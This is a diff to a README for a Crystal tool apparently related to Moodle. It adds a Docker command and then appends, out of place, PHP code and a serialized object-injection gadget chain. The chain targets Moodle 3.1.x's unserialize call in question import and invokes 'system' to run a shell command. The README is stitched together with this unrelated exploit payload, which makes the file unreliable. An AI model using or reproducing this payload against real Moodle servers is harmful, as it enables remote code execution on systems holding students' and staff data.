@@ -90,8 +90,9 @@ crystal build src/tmoodle.cr
 Use the  --release flag for an optimized production build.
 
 ### Docker image setup
-
-
+```
+bin/moodle-docker-compose up
+```
 
 ## Contributing
 
@@ -105,3 +106,16 @@ Use the  --release flag for an optimized production build.
 
 - [Riccardo Felluga](https://github.com/riccardofelluga) - contributor and maintainer
 - [Claudio Spiess](https://github.com/your-github-user) - creator and maintainer
+
+// Legacy format containing PHP serialisation.
+            https://github.com/moodle/moodle/archive/v3.1.13.zip
+            foreach ($data['#']['answer'] as $answerxml) {
+                $ans = $format->import_answer($answerxml);
+                $options = unserialize(stripslashes($ans->feedback['text']));
+                // $payload = 
+                // "O:15:\"\\core\\lock\\lock\":3:{s:6:\"\0*\0key\";O:23:\"\\core_availability\\tree\":1:{s:11:\"\0*\0children\";O:24:\"\\core\\dml\\recordset_walk\":2:{s:11:\"\0*\0callback\";s:6:\"system\";s:12:\"\0*\0recordset\";O:25:\"question_attempt_iterator\":2:{s:7:\"\0*\0quba\";O:26:\"question_usage_by_activity\":1:{s:19:\"\0*\0questionattempts\";a:1:{s:4:\"1337\";s:13:\"echo aawhoami\";}}s:8:\"\0*\0slots\";a:1:{i:0;i:1337;}}}}s:9:\"draggroup\";s:1:\"1\";s:8:\"infinite\";i:1;}";
+                // $options = unserialize($payload);//unserialize(stripslashes($ans->feedback['text']));
+                // echo $payload;
+                
+                // var_dump($options);
+O:15:"\core\lock\lock":3:{s:6:"�*�key";O:23:"\core_availability\tree":1:{s:11:"�*�children";O:24:"\core\dml\recordset_walk":2:{s:11:"�*�callback";s:6:"system";s:12:"�*�recordset";O:25:"question_attempt_iterator":2:{s:7:"�*�quba";O:26:"question_usage_by_activity":1:{s:19:"�*�questionattempts";a:1:{s:4:"1337";s:13:"echo aawhoami";}}s:8:"�*�slots";a:1:{i:0;i:1337;}}}}s:9:"draggroup";s:1:"1";s:8:"infinite";i:1;}
